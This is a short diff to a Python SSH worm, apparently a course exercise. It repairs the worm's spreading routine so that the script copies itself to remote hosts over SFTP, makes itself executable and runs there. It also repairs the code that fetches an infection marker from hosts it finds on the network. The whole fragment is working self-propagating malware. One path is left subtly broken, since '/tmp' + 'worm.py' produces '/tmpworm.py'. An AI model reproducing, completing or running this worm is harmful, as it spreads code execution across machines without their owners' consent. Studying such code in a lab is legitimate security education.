@@ -53,7 +53,7 @@ def markInfected():
 ###############################################################
 def spreadAndExecute(sshClient):
 	
-	sftpClient = ssh.opensftp()
+	sftpClient = sshClient.open_sftp()
 	sftpClient.put("worm.py", "/tmp" + "worm.py")
 	sshClient.exec_command("chmod a+x /tmp/worm.py")
 	sshClient.exec_command("python /tmp/worm.py")
@@ -256,8 +256,8 @@ for host in networkHosts:
 		try:
 			remotepath = '/tmp/infected.txt'
 			localpath = '/home/cpsc/'
-			sftp = sshInfo[0].opensftp()
-			sftp.get(filepath, localpath)
+			sftp = sshInfo[0].open_sftp()
+			sftp.get(remotepath, localpath)
 
 		except IOError:
 			print "This system should be infected"
